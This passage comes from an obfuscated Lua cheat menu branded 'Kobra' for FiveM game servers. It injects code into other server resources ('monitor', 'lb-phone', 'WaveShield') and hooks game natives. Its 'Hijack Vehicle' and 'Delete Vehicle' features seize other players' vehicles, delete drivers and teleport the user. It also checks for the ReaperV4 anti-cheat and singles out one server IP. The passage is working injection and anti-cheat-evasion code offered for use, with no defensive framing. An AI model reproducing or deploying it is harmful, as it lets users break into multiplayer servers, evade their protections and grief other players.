                        ]]);break;end end elseif _G.KobraFreecamObject then local v1351=0;local v1352;local v1353;local v1354;local v1355;local v1356;local v1357;local v1358;local v1359;local v1360;local v1361;local v1362;local v1363;local v1364;local v1365;local v1366;while true do if (v1351==(1705 -(470 + 1228))) then v1358=v1353(v1357);v1359=760 + 240 ;v1360=v1356 + (v1358 * v1359) ;v1361=StartShapeTestRay(v1356.x,v1356.y,v1356.z,v1360.x,v1360.y,v1360.z, -(1 + 0),v1354,686 -(537 + 149) );v1351=9 -1 ;end if (v1351==(4 + 2)) then v1354=PlayerPedId();v1355=GetEntityCoords(v1354);v1356=GetCamCoord(_G.KobraFreecamObject);v1357=GetCamRot(_G.KobraFreecamObject,3 -1 );v1351=21 -14 ;end if (v1351==(14 -9)) then function v1352(v1468,v1469) local v1470=0 + 0 ;local v1471;while true do if (v1470==(0 + 0)) then v1469=v1469 or (1232 + 768) ;v1471=GetGameTimer();v1470=1;end if ((1 + 0)==v1470) then while (GetGameTimer() -v1471)<v1469  do local v1663=0;while true do if (v1663==(0 + 0)) then if NetworkHasControlOfEntity(v1468) then return true;end NetworkRequestControlOfEntity(v1468);v1663=1 + 0 ;end if (v1663==(1 + 0)) then Wait(0 -0 );break;end end end return NetworkHasControlOfEntity(v1468);end end end v1353=nil;function v1353(v1472) local v1473=0 + 0 ;local v1474;local v1475;local v1476;while true do if (v1473==0) then v1474=math.rad(v1472.z);v1475=math.rad(v1472.x);v1473=1;end if (v1473==(580 -(134 + 445))) then v1476=math.abs(math.cos(v1475));return vector3( -math.sin(v1474) * v1476 ,math.cos(v1474) * v1476 ,math.sin(v1475));end end end function GetEmptySeat(v1477) local v1478=0 -0 ;local v1479;while true do if ((1 + 0)==v1478) then return  -(1 + 0);end if (0==v1478) then v1479={ -(3 -2),1860 -(1033 + 827) ,1351 -(1126 + 224) ,2};for v1664,v1665 in ipairs(v1479) do if IsVehicleSeatFree(v1477,v1665) then return v1665;end end v1478=1;end end end v1351=6 + 0 ;end if (v1351==3) then hNative("ClearPedTasksImmediately",function(v1480,...) return v1480(...);end);hNative("SetEntityCoordsNoOffset",function(v1481,...) return v1481(...);end);hNative("IsEntityAVehicle",function(v1482,...) return v1482(...);end);hNative("SetPedIntoVehicle",function(v1483,...) return v1483(...);end);v1351=13 -9 ;end if (v1351==4) then hNative("PlayerPedId",function(v1484,...) return v1484(...);end);hNative("NetworkRequestControlOfEntity",function(v1485,...) return v1485(...);end);hNative("NetworkHasControlOfEntity",function(v1486,...) return v1486(...);end);v1352=nil;v1351=5;end if (v1351==8) then v1362,v1363,v1364,v1362,v1365=GetShapeTestResult(v1361);v1366=nil;function v1366(v1487) local v1488=0;local v1489;while true do if (v1488==0) then if ( not v1487 or  not DoesEntityExist(v1487)) then return;end v1489=GetPedInVehicleSeat(v1487, -1);v1488=1;end if (v1488==(65 -(48 + 16))) then if ((v1489~=(0 + 0)) and DoesEntityExist(v1489)) then local v1710=0 -0 ;while true do if (v1710==(6 -4)) then Wait(1 + 0 );SetPedIntoVehicle(v1354,v1487, -(1090 -(910 + 179)));Wait(891 -441 );ClearPedTasksImmediately(v1354);v1710=5 -2 ;end if (v1710==(1379 -(933 + 446))) then SetPedIntoVehicle(v1354,v1487,0 + 0 );v1352(v1487,2000);Wait(1534 -(248 + 1276) );for v1773=0 + 0 ,2 + 2  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1489   .. [[)
                                        ]] );end v1710=3 -2 ;end if (v1710==(3 -2)) then Wait(1585 -(151 + 1394) );SetPedIntoVehicle(v1354,v1487, -(945 -(929 + 15)));Wait(1997 -(1173 + 823) );SetPedIntoVehicle(v1354,v1487,GetEmptySeat(v1487));v1710=2;end if (v1710==3) then SetEntityCoordsNoOffset(v1354,v1355.x,v1355.y,v1355.z,true,true,true,true);Wait(161 -61 );break;end end end break;end end end CreateThread(function() if v1363 then if ((v1365~=(1776 -(482 + 1294))) and IsEntityAVehicle(v1365)) then local v1666=v1365;v1366(v1666);end end end);break;end if (v1351==1) then hNative("GetEntityCoords",function(v1490,...) return v1490(...);end);hNative("GetCamCoord",function(v1491,...) return v1491(...);end);hNative("GetCamRot",function(v1492,...) return v1492(...);end);hNative("StartShapeTestRay",function(v1493,...) return v1493(...);end);v1351=3 -1 ;end if (v1351==0) then function hNative(v1494,v1495) local v1496=0 + 0 ;local v1497;while true do if (v1496==(1306 -(1125 + 181))) then v1497=_G[v1494];if ( not v1497 or (type(v1497)~="function")) then return;end v1496=2 -1 ;end if (v1496==(1 + 0)) then _G[v1494]=function(...) return v1495(v1497,...);end;break;end end end hNative("CreateThread",function(v1498,...) return v1498(...);end);hNative("Wait",function(v1499,...) return v1499(...);end);hNative("DoesEntityExist",function(v1500,...) return v1500(...);end);v1351=1 -0 ;end if (2==v1351) then hNative("GetShapeTestResult",function(v1501,...) return v1501(...);end);hNative("GetPedInVehicleSeat",function(v1502,...) return v1502(...);end);hNative("SetEntityVisible",function(v1503,...) return v1503(...);end);hNative("DeletePed",function(v1504,...) return v1504(...);end);v1351=1192 -(626 + 563) ;end end end elseif (v835=="Hijack Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1367=0;local v1368;while true do if (v1367==0) then v1368=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1368,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then local v1412=1250 -(153 + 1097) ;local v1413;local v1414;local v1415;local v1416;local v1417;local v1418;local v1419;local v1420;local v1421;local v1422;local v1423;local v1424;local v1425;local v1426;local v1427;while true do if (v1412==(9 -6)) then hNative("ClearPedTasksImmediately",function(v1577,...) return v1577(...);end);hNative("SetEntityCoordsNoOffset",function(v1578,...) return v1578(...);end);hNative("IsEntityAVehicle",function(v1579,...) return v1579(...);end);hNative("SetPedIntoVehicle",function(v1580,...) return v1580(...);end);v1412=4;end if (v1412==6) then v1415=PlayerPedId();v1416=GetEntityCoords(v1415);v1417=GetCamCoord(_G.KobraFreecamObject);v1418=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1412=17 -10 ;end if (v1412==0) then function hNative(v1581,v1582) local v1583=_G[v1581];if ( not v1583 or (type(v1583)~="function")) then return;end _G[v1581]=function(...) return v1582(v1583,...);end;end hNative("CreateThread",function(v1584,...) return v1584(...);end);hNative("Wait",function(v1585,...) return v1585(...);end);hNative("DoesEntityExist",function(v1586,...) return v1586(...);end);v1412=1;end if (v1412==(3 + 1)) then hNative("PlayerPedId",function(v1587,...) return v1587(...);end);hNative("NetworkRequestControlOfEntity",function(v1588,...) return v1588(...);end);hNative("NetworkHasControlOfEntity",function(v1589,...) return v1589(...);end);v1413=nil;v1412=4 + 1 ;end if (v1412==7) then v1419=v1414(v1418);v1420=1000;v1421=v1417 + (v1419 * v1420) ;v1422=StartShapeTestRay(v1417.x,v1417.y,v1417.z,v1421.x,v1421.y,v1421.z, -(1 + 0),v1415,0);v1412=6 + 2 ;end if ((2 + 0)==v1412) then hNative("GetShapeTestResult",function(v1590,...) return v1590(...);end);hNative("GetPedInVehicleSeat",function(v1591,...) return v1591(...);end);hNative("SetEntityVisible",function(v1592,...) return v1592(...);end);hNative("DeletePed",function(v1593,...) return v1593(...);end);v1412=1160 -(199 + 958) ;end if (v1412==(4 + 1)) then function v1413(v1594,v1595) v1595=v1595 or 2000 ;local v1596=GetGameTimer();while (GetGameTimer() -v1596)<v1595  do if NetworkHasControlOfEntity(v1594) then return true;end NetworkRequestControlOfEntity(v1594);Wait(0 -0 );end return NetworkHasControlOfEntity(v1594);end v1414=nil;function v1414(v1597) local v1598=0;local v1599;local v1600;local v1601;while true do if (v1598==1) then v1601=math.abs(math.cos(v1600));return vector3( -math.sin(v1599) * v1601 ,math.cos(v1599) * v1601 ,math.sin(v1600));end if ((0 -0)==v1598) then v1599=math.rad(v1597.z);v1600=math.rad(v1597.x);v1598=1177 -(1169 + 7) ;end end end function GetEmptySeat(v1602) local v1603=1873 -(751 + 1122) ;local v1604;while true do if (v1603==1) then return  -(1 + 0);end if (v1603==(0 + 0)) then v1604={ -(1 + 0),0 -0 ,1 -0 ,2};for v1713,v1714 in ipairs(v1604) do if IsVehicleSeatFree(v1602,v1714) then return v1714;end end v1603=25 -(13 + 11) ;end end end v1412=4 + 2 ;end if (v1412==(2 + 6)) then v1423,v1424,v1425,v1423,v1426=GetShapeTestResult(v1422);v1427=nil;function v1427(v1605) local v1606=1260 -(684 + 576) ;local v1607;while true do if (v1606==(1 + 0)) then if ((v1607~=(0 -0)) and DoesEntityExist(v1607)) then local v1736=0 + 0 ;while true do if (v1736==0) then SetPedIntoVehicle(v1415,v1605,0 + 0 );v1413(v1605,2611 -611 );Wait(10);for v1778=0 + 0 ,4 + 0  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1607   .. [[)
                                        ]] );end v1736=1 + 0 ;end if (v1736==(1 + 0)) then Wait(12 + 28 );SetPedIntoVehicle(v1415,v1605, -1);Wait(1849 -(230 + 1618) );SetPedIntoVehicle(v1415,v1605,GetEmptySeat(v1605));v1736=2 + 0 ;end if (v1736==3) then Wait(84 + 166 );SetPedIntoVehicle(v1415,v1605, -(1 + 0));break;end if ((205 -(131 + 72))==v1736) then Wait(1);SetPedIntoVehicle(v1415,v1605, -1);Wait(224 + 226 );ClearPedTasksImmediately(v1415);v1736=3;end end end break;end if (v1606==0) then if ( not v1605 or  not DoesEntityExist(v1605)) then return;end v1607=GetPedInVehicleSeat(v1605, -1);v1606=1;end end end CreateThread(function() if v1424 then if ((v1426~=0) and IsEntityAVehicle(v1426)) then local v1715=0;local v1716;while true do if (v1715==0) then v1716=v1426;v1427(v1716);break;end end end end end);break;end if (v1412==(205 -(144 + 60))) then hNative("GetEntityCoords",function(v1608,...) return v1608(...);end);hNative("GetCamCoord",function(v1609,...) return v1609(...);end);hNative("GetCamRot",function(v1610,...) return v1610(...);end);hNative("StartShapeTestRay",function(v1611,...) return v1611(...);end);v1412=2;end end end elseif (v835=="Delete Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1428=0;local v1429;while true do if (v1428==(0 -0)) then v1429=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1429,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then local v1505=0;local v1506;local v1507;local v1508;local v1509;local v1510;local v1511;local v1512;local v1513;local v1514;local v1515;local v1516;local v1517;local v1518;local v1519;local v1520;while true do if (v1505==(8 -3)) then v1514=v1510 + (v1512 * v1513) ;v1515=StartShapeTestRay(v1510.x,v1510.y,v1510.z,v1514.x,v1514.y,v1514.z, -(1 + 0),v1508,0 -0 );v1516,v1517,v1518,v1516,v1519=GetShapeTestResult(v1515);v1520=nil;function v1520(v1667) local v1668=0 + 0 ;local v1669;while true do if ((1923 -(523 + 1399))==v1668) then if ((v1669~=(0 + 0)) and DoesEntityExist(v1669)) then local v1774=0;while true do if (v1774==0) then SetPedIntoVehicle(v1508,v1667,404 -(72 + 332) );v1506(v1667,2976 -(269 + 707) );Wait(19 -9 );for v1788=0,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1669   .. [[)
                                        ]] );end v1774=2 -1 ;end if (v1774==(131 -(123 + 7))) then Wait(40);SetPedIntoVehicle(v1508,v1667, -1);Wait(1 + 0 );SetPedIntoVehicle(v1508,v1667,GetEmptySeat(v1667));v1774=2 + 0 ;end if ((9 -7)==v1774) then Wait(2 -1 );SetPedIntoVehicle(v1508,v1667, -(1089 -(38 + 1050)));Wait(151 + 299 );ClearPedTasksImmediately(v1508);v1774=2 + 1 ;end if (v1774==(2 + 1)) then SetEntityCoordsNoOffset(v1508,v1509.x,v1509.y,v1509.z,true,true,true,true);Wait(100);MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1667   .. [[)
                                    ]] );break;end end else local v1775=823 -(426 + 397) ;while true do if (v1775==(1407 -(751 + 655))) then MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1667   .. [[)
                                    ]] );Wait(200 -100 );v1775=2;end if ((1 + 1)==v1775) then SetEntityCoordsNoOffset(v1508,v1509.x,v1509.y,v1509.z,true,true,true,true);break;end if (v1775==0) then SetPedIntoVehicle(v1508,v1667, -(1246 -(39 + 1206)));Wait(307 -207 );v1775=842 -(566 + 275) ;end end end break;end if (v1668==(935 -(167 + 768))) then if ( not v1667 or  not DoesEntityExist(v1667)) then return;end v1669=GetPedInVehicleSeat(v1667, -(1 + 0));v1668=1;end end end CreateThread(function() if v1517 then if ((v1519~=0) and IsEntityAVehicle(v1519)) then local v1761=0;local v1762;while true do if ((0 -0)==v1761) then v1762=v1519;v1520(v1762);break;end end end end end);break;end if ((0 + 0)==v1505) then function hNative(v1670,v1671) local v1672=0 + 0 ;local v1673;while true do if (v1672==0) then v1673=_G[v1670];if ( not v1673 or (type(v1673)~="function")) then return;end v1672=1 -0 ;end if (v1672==(16 -(8 + 7))) then _G[v1670]=function(...) return v1671(v1673,...);end;break;end end end hNative("CreateThread",function(v1674,...) return v1674(...);end);hNative("Wait",function(v1675,...) return v1675(...);end);hNative("DoesEntityExist",function(v1676,...) return v1676(...);end);hNative("GetEntityCoords",function(v1677,...) return v1677(...);end);hNative("GetCamCoord",function(v1678,...) return v1678(...);end);v1505=1684 -(1510 + 173) ;end if (v1505==(4 -1)) then hNative("NetworkHasControlOfEntity",function(v1679,...) return v1679(...);end);v1506=nil;function v1506(v1680,v1681) local v1682=0 + 0 ;local v1683;while true do if (v1682==1) then while (GetGameTimer() -v1683)<v1681  do local v1763=253 -(30 + 223) ;while true do if (v1763==0) then if NetworkHasControlOfEntity(v1680) then return true;end NetworkRequestControlOfEntity(v1680);v1763=1257 -(300 + 956) ;end if (v1763==(123 -(22 + 100))) then Wait(0 -0 );break;end end end return NetworkHasControlOfEntity(v1680);end if (v1682==0) then v1681=v1681 or (2282 -(47 + 235)) ;v1683=GetGameTimer();v1682=1;end end end v1507=nil;function v1507(v1684) local v1685=0 -0 ;local v1686;local v1687;local v1688;while true do if (v1685==(0 + 0)) then v1686=math.rad(v1684.z);v1687=math.rad(v1684.x);v1685=487 -(21 + 465) ;end if (v1685==(1 + 0)) then v1688=math.abs(math.cos(v1687));return vector3( -math.sin(v1686) * v1688 ,math.cos(v1686) * v1688 ,math.sin(v1687));end end end function GetEmptySeat(v1689) local v1690=0 + 0 ;local v1691;while true do if (v1690==1) then return  -(1 + 0);end if (v1690==0) then v1691={ -1,1217 -(553 + 664) ,1 + 0 ,2};for v1764,v1765 in ipairs(v1691) do if IsVehicleSeatFree(v1689,v1765) then return v1765;end end v1690=1716 -(1128 + 587) ;end end end v1505=15 -11 ;end if (v1505==(691 -(558 + 132))) then hNative("GetCamRot",function(v1692,...) return v1692(...);end);hNative("StartShapeTestRay",function(v1693,...) return v1693(...);end);hNative("GetShapeTestResult",function(v1694,...) return v1694(...);end);hNative("GetPedInVehicleSeat",function(v1695,...) return v1695(...);end);hNative("SetEntityVisible",function(v1696,...) return v1696(...);end);hNative("DeletePed",function(v1697,...) return v1697(...);end);v1505=5 -3 ;end if (v1505==(11 -7)) then v1508=PlayerPedId();v1509=GetEntityCoords(v1508);v1510=GetCamCoord(_G.KobraFreecamObject);v1511=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1512=v1507(v1511);v1513=786 + 214 ;v1505=5;end if ((1 + 1)==v1505) then hNative("ClearPedTasksImmediately",function(v1698,...) return v1698(...);end);hNative("SetEntityCoordsNoOffset",function(v1699,...) return v1699(...);end);hNative("IsEntityAVehicle",function(v1700,...) return v1700(...);end);hNative("SetPedIntoVehicle",function(v1701,...) return v1701(...);end);hNative("PlayerPedId",function(v1702,...) return v1702(...);end);hNative("NetworkRequestControlOfEntity",function(v1703,...) return v1703(...);end);v1505=3;end end end end end end local v487=v17[v15];if v487 then if ((v487.type=="slider") or (v487.type=="slider-checkbox")) then local v836=0;local v837;local v838;while true do if (v836==(1 + 0)) then if (v837<=(16 -6)) then if (IsControlPressed(0,174) and ((v838-v300)>v301)) then v12:ScrollTwo("Left");v300=v838;elseif (IsControlPressed(0 + 0 ,90 + 85 ) and ((v838-v300)>v301)) then local v1382=771 -(294 + 477) ;while true do if (v1382==0) then v12:ScrollTwo("Right");v300=v838;break;end end end elseif IsControlPressed(0 + 0 ,174) then v12:ScrollTwo("Left");elseif IsControlPressed(0 -0 ,344 -169 ) then v12:ScrollTwo("Right");end break;end if (v836==0) then v837=v487.max or (26 + 74) ;v838=GetGameTimer();v836=1 + 0 ;end end end end end end);local v102=0 -0 ;local v103=120;local v104=0;local v105=120;local v106=982 -(97 + 885) ;local v107=120;MachoOnKeyDown(function(v302) local v303=tonumber(v302) or v302 ;local v304=v44[v303] or "Unknown" ;local v305=GetGameTimer();if (v304==v23) then if ( not v13 and v24) then v12:ShowUI();end elseif (v304=="Backspace") then if (v13 and v24) then v12:Backspace();end elseif (v304=="Enter") then if (v13 and v24) then v12:Enter();end elseif ((v304=="Q") and ((v305-v106)>v107)) then if (v13 and v24) then v12:PrevCategory();end elseif ((v304=="E") and ((v305-v106)>v107)) then if (v13 and v24) then v12:NextCategory();end elseif ((v304=="ArrowUp") and ((v305-v102)>v103)) then if v13 then v12:ScrollOne("Up");v102=v305;end elseif ((v304=="ArrowDown") and ((v305-v102)>v103)) then if v13 then local v1440=0 + 0 ;while true do if ((0 -0)==v1440) then v12:ScrollOne("Down");v102=v305;break;end end end elseif (v304=="ArrowLeft") then local v1441=0;local v1442;while true do if (v1441==(365 -(271 + 94))) then v1442=v17[v15];if v1442 then if ((v1442.type=="slider") or ((v1442.type=="slider-checkbox") and ((v305-v104)>v105))) then local v1717=1603 -(777 + 826) ;local v1718;local v1719;while true do if (v1717==(0 + 0)) then v1718=v1442.max or (1455 -(117 + 1238)) ;v1719=GetGameTimer();v1717=1716 -(686 + 1029) ;end if (v1717==(1357 -(1074 + 282))) then if (v1718<=(1627 -(1359 + 258))) then v12:ScrollTwo("Left");v104=v1719;else v12:ScrollTwo("Left");end break;end end elseif ((v1442.type=="scrollable") or (v1442.type=="scrollable-checkbox")) then v12:ScrollTwo("Left");end end break;end end elseif (v304=="ArrowRight") then local v1542=0;local v1543;while true do if (v1542==(0 -0)) then v1543=v17[v15];if v1543 then if ((v1543.type=="slider") or ((v1543.type=="slider-checkbox") and ((v305-v104)>v105))) then local v1766=1935 -(1730 + 205) ;local v1767;local v1768;while true do if (v1766==1) then if (v1767<=(538 -(67 + 461))) then v12:ScrollTwo("Right");v104=v1768;else v12:ScrollTwo("Right");end break;end if (v1766==0) then v1767=v1543.max or (178 -78) ;v1768=GetGameTimer();v1766=1 -0 ;end end elseif ((v1543.type=="scrollable") or (v1543.type=="scrollable-checkbox")) then v12:ScrollTwo("Right");end end break;end end elseif (v304=="F5") then local v1647=0;local v1648;while true do if (v1647==(0 -0)) then v1648=v17[v15];if (v13 and v24 and v1648 and ((v1648.type=="button") or (v1648.type=="checkbox") or (v1648.type=="slider-checkbox"))) then local v1769=0 + 0 ;while true do if (v1769==(630 -(129 + 500))) then v60(("Bind %s"):format(v1648.label),"",function(v1785) for v1789,v1790 in pairs(v44) do if (v1790:lower()==v1785:lower()) then local v1792=1711 -(1157 + 554) ;local v1793;while true do if (v1792==(1 -0)) then if v1793 then local v1801=607 -(82 + 525) ;while true do if ((0 + 0)==v1801) then v25[ #v25 + 1 ]={key=v1793,keyRaw=v1789,keyLabel=v44[v1789],type=v1648.type,label=v1648.label,checked=v1648.checked or false ,value=v1648.value or (2 -1) ,step=v1648.step or (1623.25 -(948 + 675)) ,min=v1648.min or (0.25 + 0) ,max=v1648.max or 5 ,onSelect=v1648.onSelect};v12:ShowKeybindList(v25);break;end end end Wait(452 + 48 );v1792=5 -3 ;end if ((855 -(406 + 447))==v1792) then v12:ShowUI();return;end if (v1792==0) then v1793=v45[v1789];for v1799,v1800 in pairs(v25) do if (v1800.keyRaw==v1789) then local v1803=117 -(91 + 26) ;while true do if (v1803==0) then v12:Notify("error","Kobra","There is already a keybind with that key!",3000);return;end end end end v1792=1;end end end end end,"keybind");break;end if ((0 -0)==v1769) then v12:HideUI();Wait(250);v1769=1 + 0 ;end end end break;end end elseif v24 then for v1721,v1722 in pairs(v25) do if (v1722.type=="button") then local v1770=986 -(968 + 18) ;local v1771;while true do if (v1770==(0 + 0)) then v1771=v1722.keyRaw;if v1771 then if (v1771==v303) then local v1794=0;while true do if (v1794==(0 + 0)) then v1722.onSelect();v12:Notify("success","Kobra",("You have executed %s!"):format(v1722.label),6086 -3086 );break;end end end end break;end end elseif (v1722.type=="checkbox") then local v1776=267 -(172 + 95) ;local v1777;while true do if ((0 -0)==v1776) then v1777=v1722.keyRaw;if (v1777 and (v1777==v303)) then v1722.checked= not v1722.checked;v12:UpdateTabChecked(v16,v1722.label,v1722.checked);if v1722.onSelect then v1722.onSelect(v1722.checked);end v12:ShowKeybindList(v25);v12:Notify((v1722.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1722.checked and "enabled") or "disabled" ,v1722.label),3265 -(260 + 5) );if v13 then v12:UpdateElements(v17);end end break;end end elseif (v1722.type=="slider-checkbox") then local v1786=0 -0 ;local v1787;while true do if (v1786==(819 -(265 + 554))) then v1787=v1722.keyRaw;if (v1787 and (v1787==v303)) then local v1797=1571 -(1440 + 131) ;while true do if (v1797==1) then if v1722.onSelect then v1722.onSelect(v1722.value,v1722.checked);end v12:ShowKeybindList(v25);v1797=5 -3 ;end if (v1797==(1395 -(253 + 1142))) then v1722.checked= not v1722.checked;v12:UpdateTabChecked(v16,v1722.label,v1722.checked);v1797=254 -(133 + 120) ;end if ((3 -1)==v1797) then v12:Notify((v1722.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1722.checked and "enabled") or "disabled" 